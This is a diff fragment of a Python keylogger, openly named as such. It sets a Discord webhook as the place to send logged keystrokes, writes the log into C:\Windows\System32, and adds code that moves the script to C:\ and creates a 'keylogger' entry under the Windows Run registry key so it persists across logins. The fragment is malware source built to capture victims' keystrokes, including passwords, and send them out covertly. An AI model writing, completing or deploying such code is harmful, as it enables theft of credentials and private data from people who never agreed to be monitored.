@@ -5,12 +5,20 @@ import keyboard
 import pyautogui
 import requests
 import winreg as reg
+import shutil
 
 # Set the webhook URL for Discord
 webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
 
 # Set the path to save the logged keypresses
 log_path = "C:\\Windows\\System32\\discord.txt"
+
+# Move the script to the C:\ directory
+script_path = sys.argv[0]
+if not script_path.startswith("C:\\"):
+    shutil.move(script_path, "C:\\")
+    script_path = "C:\\" + os.path.basename(script_path)
+    os.system('cmd /c "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d {}"'.format(script_path))
 
 # Initialize the keylogger
 def keylogger(event):
